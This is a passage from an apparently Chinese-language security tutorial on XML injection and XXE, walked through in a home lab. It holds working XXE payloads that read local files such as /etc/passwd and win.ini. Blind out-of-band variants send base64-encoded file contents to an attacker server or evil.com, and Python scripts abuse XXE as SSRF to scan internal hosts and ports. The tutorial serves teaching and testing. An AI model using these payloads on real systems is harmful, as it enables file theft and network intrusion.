+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt; #定义元素为ANY，即可以接受任何元素。</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;body&gt;&amp;xxe;&lt;&#x2F;body&gt; #定义一个外部实体</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+<p>通过第 4 行的定义， 第 7 行的 &amp;xxe 就会对 c:/test.dtd 文件资源进行 SYSTEM 关键字的引用，这样对引用资源所做的任何更改都会在文档中自动更新。</p>
+<p>另外除了上面 SYSTEM 关键字的引用方式，还有一种引用方式是使用 PUBLIC 引用公用 DTD 的方式，语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
+<p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用，但实际上实体远不止这一种，我们以上涉及的实体只是其中的一种，被称为通用实体。</p>
+<h5 id="参数实体">参数实体</h5>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt;</span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
+<p>在上面的代码示例中，可以看到实体名前多了一个 “%” ，在参数实体中使用 “% 实体名” (这里面的空格不能少) 定义，并且只能在 DTD 中使用 “% 实体名” 引用。</p>
+<p>另外和通用实体一样，参数实体也可以外部引用，同时只有在 DTD 文件中，参数实体的声明才能引用其他实体。</p>
+<h3 id="XML注入">XML注入</h3>
+<p>下面是一个普通的XML注入例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 注入前XML代码</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;USER role&#x3D;&quot;admin&quot;&gt;用户输入位置&lt;&#x2F;USER&gt;</span><br></pre></td></tr></table></figure>
+<p>当用户输入一些恶意代码，比如<code>User1&lt;/USER&gt;&lt;USER role=&quot;admin&quot;&gt;User2</code>，原XML代码就变成了下面的样子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 注入后XML代码</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;USER role&#x3D;&quot;admin&quot;&gt;User1&lt;&#x2F;USER&gt;</span><br><span class="line">&lt;USER role&#x3D;&quot;admin&quot;&gt;User2&lt;&#x2F;USER&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到通过XML语句的前后拼接， XML代码被插入了进去。</p>
+<p>对普通的 XML 注入，利用面比较狭窄，现实中也是比较鸡肋的存在，因此几乎用不到，如果有的话应该也是逻辑漏洞，下面就重点介绍XXE的利用。</p>
+<h2 id="XXE利用">XXE利用</h2>
+<p><strong>实验环境</strong></p>
+<p>目标靶机：</p>
+<p>IP：192.168.0.104</p>
+<p>环境：Win7+phpStudy+apache+php</p>
+<p>本地主机：</p>
+<p>IP：192.168.0.108</p>
+<p>环境：Win10+phpStudy+apache+BurpSuite+Python3</p>
+<h3 id="有回显读本地敏感文件（Normal-XXE）">有回显读本地敏感文件（Normal XXE）</h3>
+<p>目标靶机：xxe_test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">  $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">  $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">  $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">  $creds = simplexml_import_dom($dom);   <span class="keyword">echo</span> $creds;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在C盘下新建一个flag.txt，内容我设置成了<code>XXE Payload Executed Successfully!!!</code>。</p>
+<p>本地主机：payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200130112525.png" alt=""></p>
+<p>如果flag.txt中包含特殊符号，比如<code>&lt;&gt;&amp;&quot;'</code>等，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;XXE Payload Executed Successfully!!!&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200130113316.png" alt=""></p>
+<p>可以看到当被读取文件中含有特殊符号时，返回了一堆错误，这个时候就需要使用CDATA了。（当然，更简单的使用base64编码）</p>
+<blockquote>
+<p>什么是CDATA：</p>
+<p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。</p>
+<p>CDATA 部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束</p>
+</blockquote>
+<p>简单一点的来说，将脚本代码定义为CDATA后，CDATA部分中的内容就会被解析器忽略，这个时候就可以读取文件了。</p>
+<p>本地主机：CDATA Payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.109&#x2F;evil.dtd&quot;&gt; %dtd;]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure>
+<p>本地主机：evil.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200130142215.png" alt=""></p>
+<p>利用带有CDATA的Payload，可以看到特殊符号被成功绕过。</p>
+<p>但是在真实情况下，服务器上的XML一般用于配置文件或者传输数据，而不是显示数据，因此在现实环境下利用这个漏洞就需要找到不依靠回显的方法。</p>
+<h3 id="无回显读取本地敏感文件（Blind-XEE）">无回显读取本地敏感文件（Blind XEE）</h3>
+<h4 id="payload1">payload1</h4>
+<p>目标靶机：xxe_blind_test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">  $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">  $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">  $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本地主机：Payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.109&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<p>本地主机：evil.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.97.199.89:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200201185338.png" alt=""></p>
+<p>看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法，不编码会报错）。</p>
+<blockquote>
+<p>目标靶机的网络出了点问题，IP地址换成了192.168.50.130</p>
+</blockquote>
+<p>现在我们再来回顾一下Payload的调用过程：</p>
+<p>连续调用了三个参数实体 <code>%remote;%int;%send;</code>，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 evil.dtd ，有点类似于将 evil.dtd 包含进来，然后 %int 调用 evil.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>&amp;#37;</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，解决了 XXE 无回显的问题。</p>
+<h4 id="payload2">payload2</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;TEST.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;</span><br><span class="line">%dtd; %all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>
+<p>在我的vps的xxe.xml的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;yourvps&#x2F;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>而测试文件TEST.txt内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chybeta</span><br></pre></td></tr></table></figure>
+<p>整个的调用过程如下：解析时<code>%dtd</code>引入xxe.xml，之后<code>%all</code>引入<code>send</code>的定义，最后引用了实体send，把<code>%file</code>文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/4.jpg?raw=true" alt="img"></p>
+<p>若要读取php等文件，同样需要先经过base64加密下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;</span><br><span class="line">%dtd; %all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="思考">思考</h3>
+<p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
+<p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200201214217.png" alt=""></p>
+<h3 id="HTTP内网探测主机">HTTP内网探测主机</h3>
+<p><a target="_blank" rel="noopener" href="http://xn--inhostscan-5i2pu68rs6giudtu5ago6eof2d.py">下面是探测脚本inhostscan.py</a>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XXE</span>(<span class="params">ip,string</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">        x = requests.post(<span class="string">&#x27;http://192.168.50.132/xxe_blind_test.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">        coded_string = x.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">-2</span>]</span><br><span class="line">        print(<span class="string">&#x27; [+]&#x27;</span>,ip,<span class="string">&#x27;Successfully Found !!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27; [-]&#x27;</span>,ip,<span class="string">&#x27;Error Not Found !!!&#x27;</span>)  </span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        ip = <span class="string">&#x27;192.168.50.&#x27;</span> + str(i)</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        XXE(ip,string)</span><br></pre></td></tr></table></figure>
+<p>注意替换一下IP地址的网段。这个脚本跑的确实很慢，结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] 192.168.50.1 Successfully Found !!!</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[-] 192.168.50.130 Error Not Found !!!</span><br><span class="line">[-] 192.168.50.131 Error Not Found !!!</span><br><span class="line">[+] 192.168.50.132 Successfully Found !!!</span><br><span class="line">[+] 192.168.50.133 Successfully Found !!!</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h3 id="HTTP内网主机探测端口">HTTP内网主机探测端口</h3>
+<p>找到了内网的主机，还需要对其端口进行扫描，原理和上面一致，只不过IP固定，遍历端口，我们先用Burp Suite看一下端口开放和关闭的response有什么不同：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200206110812.png" alt=""></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200206110852.png" alt=""></p>
+<p>如果端口是关闭的，一般都会返回Connection refuse。</p>
+<p>下面放出Payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XXE</span>(<span class="params">port</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE data SYSTEM &quot;http://192.168.50.132:&quot;&quot;&quot;</span> + str(port) + <span class="string">&quot;&quot;&quot;/&quot; [&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ELEMENT data (#PCDATA)&gt; &quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;data&gt;7&lt;/data&gt;&quot;&quot;&quot;</span></span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://192.168.50.132/xxe_blind_test.php&#x27;</span>, data=xml,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="comment">#print(port,r.elapsed.total_seconds())</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;Connection refused&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        print(<span class="string">&quot; [-]&quot;</span>, port, <span class="string">&quot; seems shut down&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot; [+]&quot;</span>, port, <span class="string">&quot;is up&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9080</span>,<span class="number">9082</span>):</span><br><span class="line">        XXE(i)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>笔者测试发现不同的环境，结果可能会不一样，因此可能需要不同的payload进行端口扫描，这个需要具体结合代码和测试结果来敲定一个有效的payload。</p>
+</blockquote>
+<h2 id="如何挖掘XXE漏洞">如何挖掘XXE漏洞</h2>
+<h3 id="常用检测方法">常用检测方法</h3>
+<h4 id="首先查看XML是否可以成功解析">首先查看XML是否可以成功解析</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">&lt;!ENTITY name &quot;test1&quot;&gt;]&gt;    </span><br><span class="line">&lt;root&gt;&amp;name;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+<p>如果页面输出了test1，则可以解析XML。</p>
+<p>第二步查看是否支持DTD引用外部实体：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8”?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">&lt;!ENTITY % name SYSTEM &quot;http:&#x2F;&#x2F;myhost&#x2F;index.html&quot;&gt;  </span><br><span class="line">%name;  </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<p>然后在我的服务器上查看日志,如果有目标服务器向我的服务器发送了一条index.html的请求,说明<br>
+支持引用外部实体,很有可能存在xxe漏洞。</p>
+<h4 id="外部普通实体">外部普通实体</h4>
+<p>当有回显时，利用file://协议:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE lltest[</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="外部参数实体">外部参数实体</h4>
+<p>当无回显，使用http协议:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[ </span><br><span class="line">&lt;!ENTITY % lltest SYSTEM &quot;http:&#x2F;&#x2F;myhost:1234&#x2F;test_xxe&quot;&gt;</span><br><span class="line">%lltest;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<p>然后在myhost监听1234端口(dnslog地址也可以),查看是否有http请求。</p>
+<h3 id="Json-Content-type-XXE">Json Content-type XXE</h3>
+<p>很多Web与App应用都是基于客户端-服务器交互的Web通信服务,最常见的数据格式就是Json与XML，尽管web服务可能只使用一种格式，但是服务器却可以接收开发人员没有料到的其他数据格式，有可能导致Json节点受到XXE攻击。<br>
+测试方法很简单,就是将<code>Content-Type: application/json</code>修改为<code>Content-Type: application/xml</code>，数据格式不变，查看是否报错:<br>
+<code>&#123;&quot;errors&quot;:&#123;&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;&#125;&#125;</code><br>
+可以发现服务器是可以处理xml数据的，于是我们利用这个来进行攻击。<br>
+payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">...</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;param1&gt;name&lt;&#x2F;param1&gt;</span><br><span class="line">&lt;param2&gt;&amp;xxe;&lt;&#x2F;param2&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+<p>查看是否可以读取敏感文件。</p>
+<h3 id="利用FTP协议获取敏感信息">利用FTP协议获取敏感信息</h3>
+<p>利用ftp协议获取服务器信息/内网ip之类的技巧：<br>
+在攻击者服务器上运行rb脚本(模拟FTP服务器:<a target="_blank" rel="noopener" href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb</a>),监听8080端口。<br>
+然后在web程序那里输入payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">   &lt;!ENTITY % asd SYSTEM &quot;http:&#x2F;&#x2F;evil.com&#x2F;ext.dtd&quot;&gt; </span><br><span class="line">   %asd; </span><br><span class="line">   %rrr; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+<p>ext.dtd</p>
